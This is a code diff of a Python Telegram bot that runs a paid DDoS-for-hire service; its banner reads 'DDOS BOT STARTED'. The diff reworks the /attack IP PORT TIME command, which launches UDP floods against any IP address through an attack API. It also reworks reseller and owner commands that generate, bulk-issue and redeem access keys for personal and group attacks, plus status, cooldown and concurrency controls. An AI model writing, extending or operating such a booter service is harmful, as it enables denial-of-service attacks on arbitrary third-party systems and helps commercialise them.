-        bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n\n🎯 {ip}:{port} already being attacked\n👤 By: {existing_attack['user']}\n⏰ Finishes in: {remaining}s")
-        return
-    
-    if not is_group:
-        cooldown[uid] = time.time()
-    
-    attack_id = f"{uid}_{int(time.time())}_{random.randint(1000, 9999)}"
-    target_key = f"{ip}:{port}"
-    finish_time = time.time() + duration
-    
-    active_attacks[attack_id] = {
-        "user": uid,
-        "finish_time": finish_time,
-        "ip": ip,
-        "port": port,
-        "target_key": target_key,
-        "start_time": time.time()
-    }
-    
-    new_total = get_total_active_count()
-    current_time = format_ist_time(get_current_ist())
-    
-    if is_group:
-        content = f"│ 🎯 Target: {ip}:{port}\n│ ⏱️ Duration: {duration}s\n│ ⚡ Method: UDP (Auto)\n│ 📅 Time: {current_time}\n│ 🌐 Global Active: {new_total}/{MAX_CONCURRENT}\n│ 🔄 Group Attack Sending to API..."
-    else:
-        content = f"│ 🎯 Target: {ip}:{port}\n│ ⏱️ Duration: {duration}s\n│ ⚡ Method: UDP (Auto)\n│ 📅 Time: {current_time}\n│ 🌐 Global Active: {new_total}/{MAX_CONCURRENT}\n│ 🔄 Bot Attack Sending to API..."
-    
-    bot.reply_to(msg, styled_msg("🔥 ATTACK LAUNCHED 🔥", content, "attack"))
-    
-    def run():
-        send_attack_to_api(ip, port, duration, msg.chat.id, bot, is_hosted=False)
-        if attack_id in active_attacks:
-            del active_attacks[attack_id]
-    
-    threading.Thread(target=run).start()
-
-# ========== OTHER BOT COMMANDS (same as before) ==========
-@bot.message_handler(commands=['status'])
-def status(msg):
-    uid = str(msg.chat.id)
-    
-    if check_maintenance():
-        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
-        return
-    
-    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
-        bot.reply_to(msg, styled_msg("UNAUTHORIZED", "│ ❌ Use /redeem KEY to activate bot access", "error"))
-        return
-    
-    now = time.time()
-    slots = []
-    for attack_id, info in active_attacks.items():
-        if now < info["finish_time"]:
-            remaining = int(info["finish_time"] - now)
-            mins = remaining // 60
-            secs = remaining % 60
-            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
-            slots.append(f"❌ BUSY\n    🎯 {info['target_key']}\n    👤 {info['user']}\n    ⏰ {time_str} left")
-    
-    status_msg = f"📊 ATTACK STATUS\n📅 {format_ist_time(get_current_ist())}\n\n"
-    
-    for i in range(MAX_CONCURRENT):
-        if i < len(slots):
-            status_msg += slots[i] + "\n\n"
-        else:
-            status_msg += f"✅ SLOT {i+1}: FREE\n    💡 Ready for attack\n\n"
-    
-    status_msg += f"📊 TOTAL ACTIVE: {len(slots)}/{MAX_CONCURRENT}\n"
-    status_msg += f"🌐 GLOBAL ACTIVE: {get_total_active_count()}/{MAX_CONCURRENT}"
-    
-    if uid in cooldown:
-        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
-        if remaining > 0:
-            status_msg += f"\n\n⏳ YOUR COOLDOWN: {int(remaining)}s"
-    
-    bot.reply_to(msg, status_msg)
-
-@bot.message_handler(commands=['cooldown'])
-def cooldown_cmd(msg):
-    uid = str(msg.chat.id)
-    
-    if check_maintenance():
-        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
-        return
-    
-    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
-        bot.reply_to(msg, styled_msg("UNAUTHORIZED", "│ ❌ Use /redeem KEY to activate bot access", "error"))
-        return
-    
-    if uid in cooldown:
-        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
-        if remaining > 0:
-            bot.reply_to(msg, f"⏳ Cooldown: {int(remaining)} seconds remaining!")
-        else:
-            del cooldown[uid]
-            bot.reply_to(msg, "✅ No cooldown! You can attack now.")
-    else:
-        bot.reply_to(msg, "✅ No cooldown! You can attack now.")
-
-@bot.message_handler(commands=['setcooldown'])
-def set_cooldown(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in ADMIN_ID:
-        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
-        return
-    
-    args = msg.text.split()
-    if len(args) != 2:
-        bot.reply_to(msg, "⚠️ Usage: /setcooldown 1-300\n📌 Example: /setcooldown 60")
-        return
-    
-    try:
-        new_cooldown = int(args[1])
-        if new_cooldown < 1 or new_cooldown > 300:
-            bot.reply_to(msg, "❌ Value must be between 1 and 300 seconds!")
-            return
-    except:
-        bot.reply_to(msg, "❌ Invalid number!")
-        return
-    
-    global COOLDOWN_TIME
-    COOLDOWN_TIME = new_cooldown
-    settings["cooldown"] = new_cooldown
-    save_settings(settings)
-    
-    bot.reply_to(msg, f"✅ COOLDOWN UPDATED!\n\n⏳ New Cooldown: {COOLDOWN_TIME}s")
-
-@bot.message_handler(commands=['setmax'])
-def set_max_concurrent(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in ADMIN_ID:
-        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
-        return
-    
-    args = msg.text.split()
-    if len(args) != 2:
-        bot.reply_to(msg, "⚠️ Usage: /setmax 1-100\n📌 Example: /setmax 5")
-        return
-    
-    try:
-        new_max = int(args[1])
-        if new_max < 1 or new_max > 100:
-            bot.reply_to(msg, "❌ Value must be between 1 and 100!")
-            return
-    except:
-        bot.reply_to(msg, "❌ Invalid number!")
-        return
-    
-    global MAX_CONCURRENT
-    MAX_CONCURRENT = new_max
-    settings["max_concurrent"] = new_max
-    save_settings(settings)
-    
-    bot.reply_to(msg, f"✅ GLOBAL CONCURRENT UPDATED!\n\n⚡ New Value: {MAX_CONCURRENT}")
-
 @bot.message_handler(commands=['genkey'])
 def genkey(msg):
     uid = str(msg.chat.id)
@@ -1612,8 +1286,79 @@ def genkey(msg):
     keys_data[key] = {"user_id": "pending", "duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False, "key_type": "bot"}
     save_keys(keys_data)
     
-    expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
-    bot.reply_to(msg, f"✅ BOT KEY GENERATED!\n\n🔑 Key: {key}\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}")
+    bot.reply_to(msg, f"🔑 Key: {key}")
+
+@bot.message_handler(commands=['genkeygroup'])
+def genkeygroup(msg):
+    uid = str(msg.chat.id)
+    
+    if check_maintenance():
+        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
+        return
+    
+    if uid not in ADMIN_ID and uid not in resellers:
+        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Admin or Reseller only!", "error"))
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "⚠️ Usage: /genkeygroup 1d or /genkeygroup 5h")
+        return
+    
+    value, unit = parse_duration(args[1])
+    if value is None:
+        bot.reply_to(msg, "❌ Invalid! Use 1d or 5h")
+        return
+    
+    key = generate_key()
+    expires_at = get_expiry_date(value, unit)
+    group_keys_data[key] = {"duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False}
+    save_group_keys(group_keys_data)
+    
+    bot.reply_to(msg, f"🔑 Key: {key}")
+
+@bot.message_handler(commands=['bulk'])
+def bulk(msg):
+    uid = str(msg.chat.id)
+    
+    if check_maintenance():
+        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
+        return
+    
+    if uid not in ADMIN_ID and uid not in resellers:
+        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Admin or Reseller only!", "error"))
+        return
+    
+    args = msg.text.split()
+    if len(args) != 3:
+        bot.reply_to(msg, "⚠️ Usage: /bulk 1h 10 or /bulk 1d 5\n📌 10 = number of keys")
+        return
+    
+    duration_str = args[1]
+    try:
+        count = int(args[2])
+        if count < 1 or count > 100:
+            bot.reply_to(msg, "❌ Number of keys must be between 1 and 100!")
+            return
+    except:
+        bot.reply_to(msg, "❌ Invalid number!")
+        return
+    
+    value, unit = parse_duration(duration_str)
+    if value is None:
+        bot.reply_to(msg, "❌ Invalid duration! Use 1h or 1d")
+        return
+    
+    keys = []
+    for _ in range(count):
+        key = generate_key()
+        expires_at = get_expiry_date(value, unit)
+        keys_data[key] = {"user_id": "pending", "duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False, "key_type": "bot"}
+        keys.append(key)
+    save_keys(keys_data)
+    
+    keys_text = "\n".join(keys)
+    bot.reply_to(msg, f"{keys_text}")
 
 @bot.message_handler(commands=['removekey'])
 def remove_key(msg):
@@ -1633,13 +1378,50 @@ def remove_key(msg):
         return
     
     key = args[1]
-    if key not in keys_data:
+    if key in keys_data:
+        del keys_data[key]
+        save_keys(keys_data)
+        bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 Key: {key}")
+    elif key in group_keys_data:
+        del group_keys_data[key]
+        save_group_keys(group_keys_data)
+        bot.reply_to(msg, f"✅ GROUP KEY REMOVED!\n🔑 Key: {key}")
+    else:
         bot.reply_to(msg, "❌ Key not found!")
+
+@bot.message_handler(commands=['mykeys'])
+def mykeys(msg):
+    uid = str(msg.chat.id)
+    
+    if check_maintenance():
+        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
         return
     
-    del keys_data[key]
-    save_keys(keys_data)
-    bot.reply_to(msg, f"✅ BOT KEY REMOVED!\n🔑 Key: {key}")
+    if uid not in ADMIN_ID and uid not in resellers:
+        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Unauthorized!", "error"))
+        return
+    
+    bot_keys = []
+    for key, info in keys_data.items():
+        if info.get("generated_by") == uid and not info.get("used", False) and info.get("key_type") == "bot":
+            bot_keys.append(key)
+    
+    group_keys = []
+    for key, info in group_keys_data.items():
+        if info.get("generated_by") == uid and not info.get("used", False):
+            group_keys.append(key)
+    
+    msg_text = ""
+    if bot_keys:
+        msg_text += "BOT KEYS:\n" + "\n".join(bot_keys)
+    if group_keys:
+        if msg_text:
+            msg_text += "\n\n"
+        msg_text += "GROUP KEYS:\n" + "\n".join(group_keys)
+    if not msg_text:
+        msg_text = "No keys generated yet!"
+    
+    bot.reply_to(msg, msg_text)
 
 @bot.message_handler(commands=['add'])
 def add_user(msg):
@@ -1748,6 +1530,8 @@ def remove_reseller(msg):
 @bot.message_handler(commands=['redeem'])
 def redeem(msg):
     uid = str(msg.chat.id)
+    chat_type = msg.chat.type
+    is_group = (chat_type in ["group", "supergroup"])
     
     if check_maintenance():
         bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
@@ -1760,61 +1544,305 @@ def redeem(msg):
     
     key = args[1]
     
-    if key not in keys_data:
-        bot.reply_to(msg, "❌ Invalid bot key!")
-        return
-    
-    key_info = keys_data[key]
-    
-    if key_info.get("used", False):
-        bot.reply_to(msg, "❌ Key already used!")
-        return
-    
-    if time.time() > key_info["expires_at"]:
-        bot.reply_to(msg, "❌ Key expired!")
-        del keys_data[key]
+    # Check if it's a bot key
+    if key in keys_data:
+        key_info = keys_data[key]
+        if key_info.get("used", False):
+            bot.reply_to(msg, "❌ Key already used!")
+            return
+        if time.time() > key_info["expires_at"]:
+            bot.reply_to(msg, "❌ Key expired!")
+            del keys_data[key]
+            save_keys(keys_data)
+            return
+        if uid not in users:
+            users.append(uid)
+            users_data["users"] = users
+            save_users(users_data)
+        keys_data[key]["used"] = True
+        keys_data[key]["used_at"] = time.time()
+        keys_data[key]["used_by"] = uid
         save_keys(keys_data)
+        expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
+        content = f"│ 🎉 User: {uid}\n│ ⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}\n│ 📅 Expires: {expiry_str}\n│ ⚡ Total Concurrent: {MAX_CONCURRENT}\n│ ⏳ Cooldown: {COOLDOWN_TIME}s\n│\n│ Now you can attack in BOT using /attack command"
+        bot.reply_to(msg, styled_msg("BOT ACCESS GRANTED", content, "success"))
         return
     
-    if uid not in users:
-        users.append(uid)
-        users_data["users"] = users
-        save_users(users_data)
+    # Check if it's a group key
+    elif key in group_keys_data:
+        key_info = group_keys_data[key]
+        if key_info.get("used", False):
+            bot.reply_to(msg, "❌ Key already used!")
+            return
+        if time.time() > key_info["expires_at"]:
+            bot.reply_to(msg, "❌ Key expired!")
+            del group_keys_data[key]
+            save_group_keys(group_keys_data)
+            return
+        group_keys_data[key]["used"] = True
+        group_keys_data[key]["used_at"] = time.time()
+        group_keys_data[key]["used_by"] = uid
+        save_group_keys(group_keys_data)
+        expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
+        content = f"│ 🎉 User: {uid}\n│ ⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}\n│ 📅 Expires: {expiry_str}\n│\n│ Now you can attack in ANY GROUP using /attack command"
+        bot.reply_to(msg, styled_msg("GROUP ACCESS GRANTED", content, "success"))
+        return
     
-    keys_data[key]["used"] = True
-    keys_data[key]["used_at"] = time.time()
-    keys_data[key]["used_by"] = uid
-    save_keys(keys_data)
-    
-    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
-    duration_display = format_duration(key_info['duration_value'], key_info['duration_unit'])
-    
-    content = f"│ 🎉 User: {uid}\n│ ⏰ Duration: {duration_display}\n│ 📅 Expires: {expiry_str}\n│ ⚡ Total Concurrent: {MAX_CONCURRENT}\n│ ⏳ Cooldown: {COOLDOWN_TIME}s\n│\n│ Now you can attack in BOT using /attack command"
-    bot.reply_to(msg, styled_msg("BOT ACCESS GRANTED", content, "success"))
+    else:
+        bot.reply_to(msg, "❌ Invalid key!")
 
-@bot.message_handler(commands=['mykeys'])
-def mykeys(msg):
+@bot.message_handler(commands=['attack'])
+def attack(msg):
+    uid = str(msg.chat.id)
+    chat_type = msg.chat.type
+    is_group = (chat_type in ["group", "supergroup"])
+    
+    if check_maintenance():
+        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
+        return
+    
+    # GROUP ATTACK
+    if is_group:
+        group_id = str(msg.chat.id)
+        
+        # Check if group is configured
+        if group_id not in groups:
+            bot.reply_to(msg, styled_msg("GROUP NOT CONFIGURED", "│ ❌ This group is not configured!\n│ 📞 Contact Owner", "error"))
+            return
+        
+        max_time_limit = groups[group_id].get("attack_time", 0)
+        
+        # Check if user has group access
+        if not check_user_group_expiry(uid):
+            bot.reply_to(msg, styled_msg("GROUP ACCESS REQUIRED", f"│ 🔑 You don't have active group access!\n│\n│ Use /redeem KEY to get access\n│\n│ ⚡ Max Attack Time: {max_time_limit}s", "warning"))
+            return
+        
+        args = msg.text.split()
+        if len(args) != 4:
+            bot.reply_to(msg, f"❌ Usage: /attack IP PORT TIME\n📌 Example: /attack 20.4.57.28 17837 60\n⏱️ Max Time Allowed: {max_time_limit}s")
+            return
+        ip, port, duration = args[1], args[2], args[3]
+        try:
+            duration = int(duration)
+            if duration < 10 or duration > max_time_limit:
+                bot.reply_to(msg, f"❌ Duration must be 10-{max_time_limit} seconds for this group!")
+                return
+        except:
+            bot.reply_to(msg, "❌ Invalid time!")
+            return
+    
+    # BOT ATTACK (Personal)
+    else:
+        if not check_user_bot_expiry(uid):
+            if uid in users:
+                bot.reply_to(msg, styled_msg("BOT ACCESS EXPIRED", "│ ⚠️ Your bot access has expired!\n│ Use /redeem KEY to get new bot access", "warning"))
+            else:
+                bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Use /redeem KEY to activate bot access", "error"))
+            return
+        
+        if uid in cooldown:
+            remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
+            if remaining > 0:
+                bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!\n💡 Use /cooldown to check")
+                return
+        
+        args = msg.text.split()
+        if len(args) != 4:
+            bot.reply_to(msg, "❌ Usage: /attack IP PORT TIME\n📌 Example: /attack 20.4.57.28 17837 120")
+            return
+        ip, port, duration = args[1], args[2], args[3]
+        try:
+            duration = int(duration)
+            if duration < 10 or duration > 300:
+                bot.reply_to(msg, "❌ Duration must be 10-300 seconds!")
+                return
+        except:
+            bot.reply_to(msg, "❌ Invalid time!")
+            return
+    
+    # Common validation for both
+    if not validate_ip(ip):
+        bot.reply_to(msg, "❌ Invalid IP address!")
+        return
+    
+    try:
+        port = int(port)
+        if port in BLOCKED_PORTS:
+            blocked_ports_str = ", ".join(map(str, BLOCKED_PORTS))
+            bot.reply_to(msg, f"🚫 Blocked Port: {port}\n❌ Please enter correct port.\n\n📋 Allowed Ports: All except {blocked_ports_str}")
+            return
+        if port < 1 or port > 65535:
+            bot.reply_to(msg, "❌ Port must be between 1 and 65535!")
+            return
+    except:
+        bot.reply_to(msg, "❌ Invalid port!")
+        return
+    
+    total_active = get_total_active_count()
+    if total_active >= MAX_CONCURRENT:
+        bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks: {total_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish.")
+        return
+    
+    existing_attack = check_active_attack_by_target(ip, port)
+    if existing_attack:
+        remaining = int(existing_attack["finish_time"] - time.time())
+        bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n\n🎯 {ip}:{port} already being attacked\n👤 By: {existing_attack['user']}\n⏰ Finishes in: {remaining}s")
+        return
+    
+    if not is_group:
+        cooldown[uid] = time.time()
+    
+    attack_id = f"{uid}_{int(time.time())}_{random.randint(1000, 9999)}"
+    target_key = f"{ip}:{port}"
+    finish_time = time.time() + duration
+    
+    active_attacks[attack_id] = {
+        "user": uid,
+        "finish_time": finish_time,
+        "ip": ip,
+        "port": port,
+        "target_key": target_key,
+        "start_time": time.time()
+    }
+    
+    new_total = get_total_active_count()
+    current_time = format_ist_time(get_current_ist())
+    
+    if is_group:
+        content = f"│ 🎯 Target: {ip}:{port}\n│ ⏱️ Duration: {duration}s\n│ ⚡ Method: UDP (Auto)\n│ 📅 Time: {current_time}\n│ 🌐 Global Active: {new_total}/{MAX_CONCURRENT}\n│ 🔄 Group Attack Sending to API..."
+    else:
+        content = f"│ 🎯 Target: {ip}:{port}\n│ ⏱️ Duration: {duration}s\n│ ⚡ Method: UDP (Auto)\n│ 📅 Time: {current_time}\n│ 🌐 Global Active: {new_total}/{MAX_CONCURRENT}\n│ 🔄 Bot Attack Sending to API..."
+    
+    bot.reply_to(msg, styled_msg("🔥 ATTACK LAUNCHED 🔥", content, "attack"))
+    
+    def run():
+        send_attack_to_api(ip, port, duration, msg.chat.id, bot, is_hosted=False)
+        if attack_id in active_attacks:
+            del active_attacks[attack_id]
+    
+    threading.Thread(target=run).start()
+
+@bot.message_handler(commands=['status'])
+def status(msg):
     uid = str(msg.chat.id)
     
     if check_maintenance():
         bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
         return
     
-    if uid not in ADMIN_ID and uid not in resellers:
-        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Unauthorized!", "error"))
+    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
+        if not check_user_group_expiry(uid):
+            bot.reply_to(msg, styled_msg("UNAUTHORIZED", "│ ❌ Use /redeem KEY to activate access", "error"))
+            return
+    
+    now = time.time()
+    slots = []
+    for attack_id, info in active_attacks.items():
+        if now < info["finish_time"]:
+            remaining = int(info["finish_time"] - now)
+            mins = remaining // 60
+            secs = remaining % 60
+            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
+            slots.append(f"❌ BUSY\n    🎯 {info['target_key']}\n    👤 {info['user']}\n    ⏰ {time_str} left")
+    
+    status_msg = f"📊 ATTACK STATUS\n📅 {format_ist_time(get_current_ist())}\n\n"
+    
+    for i in range(MAX_CONCURRENT):
+        if i < len(slots):
+            status_msg += slots[i] + "\n\n"
+        else:
+            status_msg += f"✅ SLOT {i+1}: FREE\n    💡 Ready for attack\n\n"
+    
+    status_msg += f"📊 TOTAL ACTIVE: {len(slots)}/{MAX_CONCURRENT}\n"
+    status_msg += f"🌐 GLOBAL ACTIVE: {get_total_active_count()}/{MAX_CONCURRENT}"
+    
+    if uid in cooldown:
+        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
+        if remaining > 0:
+            status_msg += f"\n\n⏳ YOUR COOLDOWN: {int(remaining)}s"
+    
+    bot.reply_to(msg, status_msg)
+
+@bot.message_handler(commands=['cooldown'])
+def cooldown_cmd(msg):
+    uid = str(msg.chat.id)
+    
+    if check_maintenance():
+        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
         return
     
-    my_generated_keys = []
-    for key, info in keys_data.items():
-        if info.get("generated_by") == uid and not info.get("used", False) and info.get("key_type") == "bot":
-            expires = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
-            duration_display = format_duration(info['duration_value'], info['duration_unit'])
-            my_generated_keys.append(f"🔑 {key}\n   ⏰ {duration_display}\n   📅 Expires: {expires}")
+    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
+        if not check_user_group_expiry(uid):
+            bot.reply_to(msg, styled_msg("UNAUTHORIZED", "│ ❌ Use /redeem KEY to activate access", "error"))
+            return
     
-    if my_generated_keys:
-        bot.reply_to(msg, f"📋 YOUR GENERATED BOT KEYS:\n\n" + "\n\n".join(my_generated_keys))
+    if uid in cooldown:
+        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
+        if remaining > 0:
+            bot.reply_to(msg, f"⏳ Cooldown: {int(remaining)} seconds remaining!")
+        else:
+            del cooldown[uid]
+            bot.reply_to(msg, "✅ No cooldown! You can attack now.")
     else:
-        bot.reply_to(msg, "📋 No bot keys generated yet!")
+        bot.reply_to(msg, "✅ No cooldown! You can attack now.")
+
+@bot.message_handler(commands=['setcooldown'])
+def set_cooldown(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "⚠️ Usage: /setcooldown 1-300\n📌 Example: /setcooldown 60")
+        return
+    
+    try:
+        new_cooldown = int(args[1])
+        if new_cooldown < 1 or new_cooldown > 300:
+            bot.reply_to(msg, "❌ Value must be between 1 and 300 seconds!")
+            return
+    except:
+        bot.reply_to(msg, "❌ Invalid number!")
+        return
+    
+    global COOLDOWN_TIME
+    COOLDOWN_TIME = new_cooldown
+    settings["cooldown"] = new_cooldown
+    save_settings(settings)
+    
+    bot.reply_to(msg, f"✅ COOLDOWN UPDATED!\n\n⏳ New Cooldown: {COOLDOWN_TIME}s")
+
+@bot.message_handler(commands=['setmax'])
+def set_max_concurrent(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "⚠️ Usage: /setmax 1-100\n📌 Example: /setmax 5")
+        return
+    
+    try:
+        new_max = int(args[1])
+        if new_max < 1 or new_max > 100:
+            bot.reply_to(msg, "❌ Value must be between 1 and 100!")
+            return
+    except:
+        bot.reply_to(msg, "❌ Invalid number!")
+        return
+    
+    global MAX_CONCURRENT
+    MAX_CONCURRENT = new_max
+    settings["max_concurrent"] = new_max
+    save_settings(settings)
+    
+    bot.reply_to(msg, f"✅ GLOBAL CONCURRENT UPDATED!\n\n⚡ New Value: {MAX_CONCURRENT}")
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast(msg):
@@ -1956,7 +1984,7 @@ def help_cmd(msg):
         group_id = str(msg.chat.id)
         max_time = groups.get(group_id, {}).get("attack_time", None)
         if max_time is not None and max_time > 0:
-            content = f"│ 📝 GROUP HELP\n│\n│ /groupredeem KEY - Get group access\n│ /attack IP PORT TIME - Max {max_time}s\n│ /help\n│ /start\n│ 📅 {current_time}"
+            content = f"│ 📝 GROUP HELP\n│\n│ /redeem KEY - Get group access\n│ /attack IP PORT TIME - Max {max_time}s\n│ /help\n│ /start\n│ 📅 {current_time}"
         else:
             content = f"│ 📝 GROUP HELP\n│\n│ /help\n│ /start\n│ 📅 {current_time}"
         bot.reply_to(msg, styled_msg("GROUP HELP", content))
@@ -1974,11 +2002,14 @@ def help_cmd(msg):
 │
 │ 🔑 BOT KEYS:
 │   /genkey 1 or 5h - Generate bot key
-│   /removekey KEY - Remove bot key
+│   /bulk 1h 10 - Generate bulk bot keys
 │
-│ 👥 GROUP KEYS:
-│   /groupkey GROUP_ID 1h 10 - Generate group keys
-│   /grouprkey GROUP_ID - Remove unused group keys
+│ 🔑 GROUP KEYS:
+│   /genkeygroup 1d or 5h - Generate group key
+│
+│ 🔧 OTHER KEYS:
+│   /removekey KEY - Remove key
+│   /mykeys - View your keys
 │
 │ 👥 USERS:
 │   /add USER - Add bot access user
@@ -2016,16 +2047,19 @@ def help_cmd(msg):
 │
 │ 🔑 BOT KEYS:
 │   /genkey 1 or 5h
-│   /mykeys
+│   /bulk 1h 10
 │
-│ 👥 GROUP KEYS:
-│   /groupkey GROUP_ID 1h 10
+│ 🔑 GROUP KEYS:
+│   /genkeygroup 1d or 5h
+│
+│ 🔧 OTHER:
+│   /mykeys
 │
 │ 📅 {current_time}"""
         bot.reply_to(msg, styled_msg("RESELLER HELP", content))
     
     elif uid in users:
-        if check_user_expiry(uid):
+        if check_user_bot_expiry(uid):
             content = f"""│ 🔥 USER HELP (BOT ACCESS)
 │
 │ ⚔️ BOT ATTACK:
@@ -2036,7 +2070,7 @@ def help_cmd(msg):
 │ 🔑 KEYS:
 │   /redeem KEY - Get bot access
 │
-│ 🔸 For GROUP attack: Use /groupredeem KEY in group
+│ 🔸 For GROUP attack: Use /redeem KEY in group
 │
 │ 📅 {current_time}"""
             bot.reply_to(msg, styled_msg("USER HELP", content))
@@ -2045,20 +2079,31 @@ def help_cmd(msg):
 │
 │ Use /redeem KEY to activate bot access
 │
-│ 🔸 For GROUP attack: Use /groupredeem KEY in group
+│ 🔸 For GROUP attack: Use /redeem KEY in group
 │
 │ 📅 {current_time}"""
             bot.reply_to(msg, styled_msg("HELP", content, "warning"))
     
     else:
-        content = f"""│ ❌ UNAUTHORIZED
+        if check_user_group_expiry(uid):
+            content = f"""│ 🔥 USER HELP (GROUP ACCESS)
 │
-│ 🔑 Use /redeem KEY to activate bot access
+│ ⚔️ GROUP ATTACK:
+│   /attack IP PORT TIME
+│   /status
+│   /cooldown
 │
-│ 🔸 For GROUP attack: Use /groupredeem KEY in group
+│ 🔸 For BOT attack: Use /redeem KEY in bot
 │
 │ 📅 {current_time}"""
-        bot.reply_to(msg, styled_msg("HELP", content, "error"))
+            bot.reply_to(msg, styled_msg("USER HELP", content))
+        else:
+            content = f"""│ ❌ UNAUTHORIZED
+│
+│ 🔑 Use /redeem KEY to activate access
+│
+│ 📅 {current_time}"""
+            bot.reply_to(msg, styled_msg("HELP", content, "error"))
 
 @bot.message_handler(commands=['host'])
 def host_bot(msg):
@@ -2180,7 +2225,7 @@ def maintenance(msg):
 
 # ========== START BOT ==========
 print("=" * 50)
-print("✨ XSILENT BOT STARTED ✨")
+print("✨ DDOS BOT STARTED ✨")
 print(f"👑 Owners: 8487946379, 7495474613")
 print(f"⚡ Global Concurrent: {MAX_CONCURRENT}")
 print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
